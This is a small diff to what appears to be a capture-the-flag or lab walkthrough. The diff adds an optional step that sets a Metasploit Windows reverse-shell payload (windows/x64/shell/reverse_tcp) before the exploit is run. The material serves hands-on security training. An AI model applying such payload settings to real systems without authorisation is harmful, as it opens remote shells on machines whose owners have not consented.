@@ -161,6 +161,11 @@ RHOSTS
 
 <br />
 
+As mentioned in the task description, this step is optional - No harm in learning something new though.
+```
+set payload windows/x64/shell/reverse_tcp
+```
+
 We are now ready to run the exploit.
 ```
 No answer needed
